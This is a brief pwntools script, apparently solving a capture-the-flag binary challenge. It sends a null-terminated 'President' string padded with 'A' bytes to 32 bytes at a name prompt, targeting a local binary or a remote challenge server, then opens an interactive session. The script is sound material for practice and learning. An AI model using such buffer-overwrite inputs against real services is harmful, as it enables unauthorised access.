#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  9010
HOST = "61.14.233.78"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = b"President\0"
pl = pl.ljust(32, b'A')
p.sendlineafter(b"name: ", pl)

p.interactive()